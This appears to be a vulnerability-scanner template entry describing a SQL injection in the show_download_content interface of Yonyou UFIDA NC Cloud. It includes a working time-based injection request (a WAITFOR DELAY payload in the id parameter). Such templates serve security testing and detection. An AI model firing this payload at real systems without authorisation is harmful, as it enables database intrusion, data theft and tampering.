# Nuclei Template: UFIDA NC Cloud - SQL Injection
**Template ID:** yonyou-ufida-cloud-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**Source:** Nuclei Template (`yonyou-ufida-nc-cloud-sqli.yaml`)

## Vulnerability Information & PoC

## Description
The NC-Cloud system's show_download_content interface has a SQL injection vulnerability, which allows attackers to manipulate the database through maliciously constructed SQL statements, resulting in data leaks, tampering or destruction, and seriously threatening system security.

## Steps to reproduce / Exploit Payload
```http
@timeout 30s
GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
Host: {{Hostname}}
```

## References
- https://blog.csdn.net/xc_214/article/details/141884644
